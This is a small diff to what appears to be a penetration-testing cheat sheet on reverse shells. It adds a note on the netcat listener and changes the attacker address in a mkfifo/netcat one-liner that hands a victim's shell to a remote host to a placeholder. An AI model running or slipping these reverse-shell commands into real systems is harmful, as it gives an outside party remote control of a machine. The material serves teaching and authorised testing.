@@ -596,6 +596,7 @@ Reference : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Meth
 
 ## On the attacker system
 | The first step is to start a listener on the attacker box, so the victim will connect (reverse = from the victim to the attacker outside your network)
+| No need to specify the ip adress as it will bind to 0.0.0.0
 ```
 nc -nlvp 8080
 ```
@@ -603,7 +604,7 @@ nc -nlvp 8080
 ## On the victim system
 | The second step is to connect to the attacker and give acces to the victim shell
 ```
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
 ```
 
 
